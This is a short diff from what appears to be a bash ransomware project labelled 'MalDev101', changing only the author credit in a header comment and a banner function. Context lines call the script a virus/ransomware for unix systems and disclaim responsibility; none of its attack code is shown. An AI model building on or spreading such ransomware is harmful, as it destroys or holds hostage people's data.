@@ -26,7 +26,7 @@
 #     __//   __;_`-  \ `;.__,;' ------------------------------------
 #   ((,--,) (((,------;  `--' --------------------------------------
 #
-# Created by TheG0df2ther a MalDev101 project
+# Created by Da2dalus a MalDev101 project
 # This is only an experiment but it can be dangerous.
 # I am not responsible for the damage.
 # This is a virus/ransomware that works on unix systems with bash installed.
@@ -252,7 +252,7 @@ function banner_text() {
    
    echo -e " $UBlue
    
-   # Created by TheG0df2ther a MalDev101 project
+   # Created by Da2dalus a MalDev101 project
    # This is only an experiment but it can be dangerous.
    # I am not responsible for the damage.
    # This is a virus/ransomware that works on unix systems with bash installed.
